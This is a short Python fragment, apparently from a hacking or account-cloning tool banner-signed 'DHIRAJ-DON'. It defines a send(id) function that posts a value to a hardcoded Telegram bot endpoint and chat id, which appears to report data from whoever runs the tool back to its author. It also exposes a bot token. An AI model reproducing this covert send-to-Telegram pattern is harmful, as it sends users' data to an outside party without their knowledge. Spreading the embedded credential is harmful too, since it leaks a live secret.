...
import requests
def send(id):
    urll = "https://api.telegram.org/bot6341818920:AAG0VZxrUmgQZyiq2VDCLZwetqW6ijUoyZ0/sendMessage"
    data = {'chat_id'   : '6289325102',
            'text'      : id
            }
...
╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ 
  ...
  ---------------------------DHIRAJ-DON👿------------------------                                                  
 \x1b[1;95mAUTHOR     : DHIRAJ 
 \x1b[1;96m GITHUB     : DHIRAJ-XWT  
 \x1b[1;94m FACEBOOK  : DHIRAJ DHIRAJ 
